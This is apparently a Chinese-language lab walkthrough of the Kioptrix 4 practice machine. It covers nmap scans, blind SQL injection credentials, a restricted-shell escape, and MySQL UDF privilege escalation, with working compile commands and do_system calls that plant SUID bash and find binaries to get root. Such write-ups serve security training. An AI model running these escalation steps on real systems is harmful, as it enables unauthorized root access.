
## 扫描

```
please input the ip address :192.168.80.145
start scan 192.168.80.145
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 15:09 CST
Nmap scan report for 192.168.80.145
Host is up (0.0026s latency).
Not shown: 39528 closed tcp ports (reset), 26003 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 18.62 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 15:09 CST
Nmap scan report for 192.168.80.145
Host is up (0.0021s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   open          netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 12.94 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 15:09 CST
Nmap scan report for 192.168.80.145
Host is up (0.0025s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.27 - 2.6.28 (95%), Linux 2.6.9 - 2.6.33 (94%), Linux 2.6.8 - 2.6.30 (94%), Linux 2.6.22 (embedded, ARM) (94%), Linux 2.6.22 - 2.6.23 (94%), Arris TG862G/CT cable modem (93%), Linux 2.6.22 (93%), Dell iDRAC 6 remote access controller (Linux 2.6) (93%), ZyXEL NSA-200 NAS device (93%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2024-01-16T10:10:24-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 10h30m07s, deviation: 3h32m07s, median: 8h00m07s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   0.93 ms DESKTOP-SH1BMBR (172.26.32.1)
2   3.53 ms 192.168.80.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.18 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 15:10 CST
Stats: 0:04:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.21% done; ETC: 15:15 (0:00:02 remaining)
Stats: 0:04:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.21% done; ETC: 15:15 (0:00:02 remaining)
Stats: 0:04:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.21% done; ETC: 15:15 (0:00:02 remaining)
Stats: 0:04:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.21% done; ETC: 15:15 (0:00:02 remaining)
Stats: 0:04:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.21% done; ETC: 15:15 (0:00:02 remaining)
Stats: 0:04:33 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.21% done; ETC: 15:15 (0:00:02 remaining)
Stats: 0:04:33 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.21% done; ETC: 15:15 (0:00:02 remaining)
Nmap scan report for 192.168.80.145
Host is up (0.0032s latency).

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum:
|   /database.sql: Possible database backup
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
|_  /index/: Potentially interesting folder
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 327.45 second


```
# SMB枚举

> smbmap -H 192.168.80.145 
> 没有任何发现 
## SQL布尔盲注

>用盲注得到凭据
![[Pasted image 20240116220204.png]]

```
# john  : MyNameIsJohn
# robert  : adgadsafdfwt4gadfga
```
>尝试页面登录发现登录也没有任何可以操作的地方，用凭据进行ssh登录，发现可以登录成功。发现bash环境不正常，搜索发现解除受限方式
```
echo os.system('/bin/bash')
```

## UDF提权

> searchsploit udf -m 1518

**目标机器为32位环境所以对exp进行编译需要安装以下的gcc扩展**
```
sudo apt-get install gcc-multilib 
```
**然后在编译的语句中加入选项-m并指定32，并且最终拷入/usr/lib的.so文件名不能太短，会爆错**
```
gcc -g -c -m32 exp.c

gcc -m32 -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so exp.o -lc
 

```

**在最后一步进行函数生成**

```
select do_system('cp /bin/bash /home/john/xbash; chmod +xs /home/john/xbash');
发现以上语句所生成的xbash并不能提权成功


所以将find命令加入suid权限进行提权
select do_system('cp /usr/bin/find /home/john/xfind; chmod +xs /home/john/xfind');

执行
./xfind . -exec /bin/bash -p \; -quit

发现提权成功
```




